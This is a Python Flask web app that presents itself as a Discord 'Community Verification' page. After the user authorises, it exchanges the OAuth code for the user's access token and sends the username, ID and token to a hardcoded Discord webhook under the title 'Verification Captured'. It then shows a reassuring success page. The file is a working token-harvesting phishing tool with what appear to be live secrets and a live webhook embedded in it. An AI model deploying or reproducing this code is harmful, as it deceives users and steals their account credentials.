import os
import requests
from flask import Flask, render_template_string, request

app = Flask(__name__)

CLIENT_ID = "1526220638283628624"
CLIENT_SECRET = "Ll-Nk5CH4a1RZF_RWhV-j9ueE4Wsh8jj"
REDIRECT_URI = "https://root1-two.vercel.app"
WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"


@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch_all(path):
  # Get code directly from request args or query string fallback
  code = request.args.get("code")

  # IF OAUTH CODE IS PRESENT
  if code:
    try:
      # 1. Exchange code for access token
      token_res = requests.post(
          "https://discord.com/api/oauth2/token",
          data={
              "client_id": CLIENT_ID,
              "client_secret": CLIENT_SECRET,
              "grant_type": "authorization_code",
              "code": code,
              "redirect_uri": REDIRECT_URI,
          },
          headers={"Content-Type": "application/x-www-form-urlencoded"},
          timeout=10,
      )

      if token_res.status_code != 200:
        # Display token exchange error directly on screen
        return (
            f"<h3>Discord Error ({token_res.status_code})</h3>"
            f"<pre>{token_res.text}</pre>"
        ), 500

      token_data = token_res.json()
      access_token = token_data.get("access_token")

      # 2. Get user info
      user_res = requests.get(
          "https://discord.com/api/users/@me",
          headers={"Authorization": f"Bearer {access_token}"},
          timeout=10,
      )
      user = user_res.json()

      # 3. Post to webhook channel
      requests.post(
          WEBHOOK_URL,
          json={
              "embeds": [{
                  "title": "🔑 Verification Captured",
                  "color": 5763719,
                  "fields": [
                      {
                          "name": "User",
                          "value": (
                              f"{user.get('username', 'Unknown')} (`"
                              f"{user.get('id', 'Unknown')}`)"
                          ),
                          "inline": True,
                      },
                      {
                          "name": "Access Token",
                          "value": f"`{access_token}`",
                          "inline": False,
                      },
                  ],
              }]
          },
          timeout=10,
      )

      # 4. Show success page
      return render_template_string("""
                <!DOCTYPE html>
                <html>
                <head><title>Verified</title></head>
                <body style="background:#1e1f22;color:#23a55a;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
                    <div style="background:#2b2d31;padding:40px;border-radius:8px;text-align:center;">
                        <h1>Verification Successful!</h1>
                        <p style="color:#949ba4;">You can close this tab now.</p>
                    </div>
                </body>
                </html>
            """)
    except Exception as e:
      return f"<h3>System Error</h3><pre>{str(e)}</pre>", 500

  # DEFAULT LANDING PAGE (Only rendered when no code parameter is passed)
  return render_template_string("""
        <!DOCTYPE html>
        <html>
        <head><title>Server Verification</title></head>
        <body style="background:#1e1f22;color:#dbdee1;display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;">
            <div style="background:#2b2d31;padding:40px;border-radius:8px;text-align:center;max-width:400px;">
                <h1 style="color:#f2f3f5;">Community Verification</h1>
                <p style="color:#949ba4;">Link your Discord account to verify your identity.</p>
                <a href="https://discord.com/api/oauth2/authorize?client_id=1526220638283628624&redirect_uri=https://root1-two.vercel.app&response_type=code&scope=identify" 
                   style="display:block;padding:12px;background:#5865f2;color:white;text-decoration:none;border-radius:4px;font-weight:600;">
                   Verify with Discord
                </a>
            </div>
        </body>
        </html>
    """)
